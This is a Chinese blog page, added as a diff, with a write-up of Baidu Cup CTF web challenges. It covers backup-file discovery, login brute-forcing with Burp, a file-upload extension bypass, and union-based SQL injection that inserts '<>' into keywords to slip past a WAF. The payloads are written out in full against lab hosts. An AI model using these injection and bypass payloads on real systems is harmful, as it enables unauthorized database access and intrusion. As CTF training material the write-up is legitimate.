@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      百度杯writeup | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="百度杯有点难度啊，做了好久还是不会做，参考其他人做了几道。还有几道没有做，以后继续做做一、123http://3314e738918246a0bb89cd7d73b4000ad41ccb304b974710.game.ichunqiu.com/login.php提示：12341234，然后就解开了
+老规矩，先看看源代码有没有提示什么的，发现有提示啊">
+<meta property="og:type" content="article">
+<meta property="og:title" content="百度杯writeup | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2016/09/28/百度杯writeup/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="百度杯有点难度啊，做了好久还是不会做，参考其他人做了几道。还有几道没有做，以后继续做做一、123http://3314e738918246a0bb89cd7d73b4000ad41ccb304b974710.game.ichunqiu.com/login.php提示：12341234，然后就解开了
+老规矩，先看看源代码有没有提示什么的，发现有提示啊">
+<meta property="og:image" content="http://p1.bpimg.com/567571/3a0ecd82c61b4414.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/fe37b38389a4c340.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/a2b3063e7b4656a9.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/21ffad3e270629b5.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/15f9bdda76040d08.png">
+<meta property="og:image" content="http://p1.bqimg.com/567571/2f077f8b31bc7188.png">
+<meta property="og:image" content="http://p1.bqimg.com/567571/755f2a7c990ec6d0.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/2cc0c7a687cae994.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/6ccee19102cc3f80.png">
+<meta property="og:updated_time" content="2016-09-30T12:00:02.890Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="百度杯writeup | Hello,C">
+<meta name="twitter:description" content="百度杯有点难度啊，做了好久还是不会做，参考其他人做了几道。还有几道没有做，以后继续做做一、123http://3314e738918246a0bb89cd7d73b4000ad41ccb304b974710.game.ichunqiu.com/login.php提示：12341234，然后就解开了
+老规矩，先看看源代码有没有提示什么的，发现有提示啊">
+<meta name="twitter:image" content="http://p1.bpimg.com/567571/3a0ecd82c61b4414.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">百度杯writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-09-28" class="post-meta__date date">2016-09-28</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="百度杯有点难度啊，做了好久还是不会做，参考其他人做了几道。还有几道没有做，以后继续做做"><a href="#百度杯有点难度啊，做了好久还是不会做，参考其他人做了几道。还有几道没有做，以后继续做做" class="headerlink" title="百度杯有点难度啊，做了好久还是不会做，参考其他人做了几道。还有几道没有做，以后继续做做"></a>百度杯有点难度啊，做了好久还是不会做，参考其他人做了几道。还有几道没有做，以后继续做做</h3><h3 id="一、123"><a href="#一、123" class="headerlink" title="一、123"></a>一、123</h3><p><a href="http://3314e738918246a0bb89cd7d73b4000ad41ccb304b974710.game.ichunqiu.com/login.php" target="_blank" rel="external">http://3314e738918246a0bb89cd7d73b4000ad41ccb304b974710.game.ichunqiu.com/login.php</a><br>提示：12341234，然后就解开了</p>
+<p>老规矩，先看看源代码有没有提示什么的，发现有提示啊</p>
+<a id="more"></a>
+<p><img src="http://p1.bpimg.com/567571/3a0ecd82c61b4414.png" alt=""></p>
+<p>那么访问user.php看看，发现是一片空白，源代码也没有什么提示，想想临时文件试试，像~、bak等等，构造代码</p>
+<pre><code>http://3314e738918246a0bb89cd7d73b4000ad41ccb304b974710.game.ichunqiu.com/user.php.bak
+</code></pre><p>可是竟然出现了405，显示被拦了。POST访问便可通过</p>
+<p><img src="http://i1.piimg.com/567571/fe37b38389a4c340.png" alt=""></p>
+<p>发现临时文件全是一些用户名，登录界面没有任何限制，可以用buru进行爆破登录，根据上面源码提示进行爆破</p>
+<p>我们先在1990里试试</p>
+<p><img src="http://i1.piimg.com/567571/a2b3063e7b4656a9.png" alt=""></p>
+<p>爆破出用户名和密码：lixiuyun   lixiuyun1990，继而登录</p>
+<p>没有什么信息，又是查看源代码</p>
+<p><img src="http://i1.piimg.com/567571/21ffad3e270629b5.png" alt=""></p>
+<p>发现上传地方被注释掉了，我们还原一下，得出上传页面上传，通过改后缀名为通过 a.jpg.pht得出</p>
+<blockquote>
+<p>pht : 也是一种图片的格式，多数是由手机拍摄的</p>
+</blockquote>
+<p><img src="http://i1.piimg.com/567571/15f9bdda76040d08.png" alt=""></p>
+<p>发现有一个view.php,继续跟进<a href="http://773e88c7e5d14ec1b93b571dcce597ba13ae6d4f98d44d86.game.ichunqiu.com/view.php" target="_blank" rel="external">http://773e88c7e5d14ec1b93b571dcce597ba13ae6d4f98d44d86.game.ichunqiu.com/view.php</a><br>访问发现不在这，提示<strong><em>file?</em></strong>，继续进行各种测试，最后构造双flag得出<br><a href="http://773e88c7e5d14ec1b93b571dcce597ba13ae6d4f98d44d86.game.ichunqiu.com/view.php?file=flaflagg" target="_blank" rel="external">http://773e88c7e5d14ec1b93b571dcce597ba13ae6d4f98d44d86.game.ichunqiu.com/view.php?file=flaflagg</a></p>
+<pre><code>&lt;?php 
+echo &apos;flag is here&apos;;
+&apos;flag{94c0e93e-1cd1-4240-82bd-a13a6a06701f}-&apos;;
+?&gt;
+</code></pre><h2 id="二、注入"><a href="#二、注入" class="headerlink" title="二、注入"></a>二、注入</h2><p><a href="http://b6106ae09aa545d8b72a9ad59926e77bee2d261106ad44c8.game.ichunqiu.com/index.php?id=1" target="_blank" rel="external">http://b6106ae09aa545d8b72a9ad59926e77bee2d261106ad44c8.game.ichunqiu.com/index.php?id=1</a></p>
+<p>由burp抓包发现过滤<strong><em>&lt;&gt;</em></strong>构造：</p>
+<pre><code>http://b6106ae09aa545d8b72a9ad59926e77bee2d261106ad44c8.game.ichunqiu.com/index.php?id=1 o&lt;&gt;rder b&lt;&gt;y 3
+</code></pre><p><img src="http://p1.bqimg.com/567571/2f077f8b31bc7188.png" alt=""></p>
+<pre><code>http://b6106ae09aa545d8b72a9ad59926e77bee2d261106ad44c8.game.ichunqiu.com/index.php?id=1 un&lt;&gt;ion se&lt;&gt;lect 1,2,3
+</code></pre><p><img src="http://p1.bqimg.com/567571/755f2a7c990ec6d0.png" alt=""></p>
+<pre><code>http://65c9963a9937461aadae1d39b40ff2bcb1bc9016780643b2.game.ichunqiu.com/index.php?id=1 un&lt;&gt;ion se&lt;&gt;lect 1,(se&lt;&gt;lect column_name fr&lt;&gt;om informat&lt;&gt;ion_schema.columns wh&lt;&gt;ere table_schema=&apos;sqli&apos; an&lt;&gt;d table_name=&apos;info&apos; lim&lt;&gt;it 2,1),3
+</code></pre><p><img src="http://i1.piimg.com/567571/2cc0c7a687cae994.png" alt=""></p>
+<pre><code>http://65c9963a9937461aadae1d39b40ff2bcb1bc9016780643b2.game.ichunqiu.com/index.php?id=1 uni&lt;&gt;on se&lt;&gt;lect 1,(sel&lt;&gt;ect flAg_T5ZNdrm fr&lt;&gt;om info lim&lt;&gt;it 1),3
+</code></pre><p><img src="http://i1.piimg.com/567571/6ccee19102cc3f80.png" alt=""></p>
+<p><strong><em>1、.接着用联合语句查看可显示字段:</em></strong></p>
+<pre><code>php?id=1  un&lt;&gt;ion s&lt;&gt;elect 1,2,3
+</code></pre><p>返回了一个2.说明第二个字段是可显示的。</p>
+<p><strong><em>2、.爆表名:</em></strong></p>
+<pre><code>index.php?id=1  un&lt;&gt;ion s&lt;&gt;elect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
+</code></pre><p>返回了info</p>
+<p><strong><em>3、爆字段名</em></strong></p>
+<pre><code>/index.php?id=1  un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(column_name),3 from information_schema.columns where table_name=0x696e666f
+</code></pre><p>table name后面的参数是0x加上刚才的info转为16进制。</p>
+<p>这时发现又出现了405，说明加入的东西肯定有些事不能绕过防火墙的，同理，用&lt;&gt;绕过，</p>
+<pre><code>/index.php?id=1  un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(c&lt;&gt;olumn_name),3 from information_schema.colu&lt;&gt;mns wh&lt;&gt;ere table_name=0x696e666f
+</code></pre><p>返回了id,title,flAg_T5ZNdrm三个字段。</p>
+<p><strong><em>4、爆字段flAg_T5ZNdrm里面的内容</em></strong></p>
+<pre><code>index.php?id=1  un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(flAg_T5ZNdrm),3 from info
+</code></pre><p>返回了flag。</p>
+
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2016/09/28/百度杯writeup/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
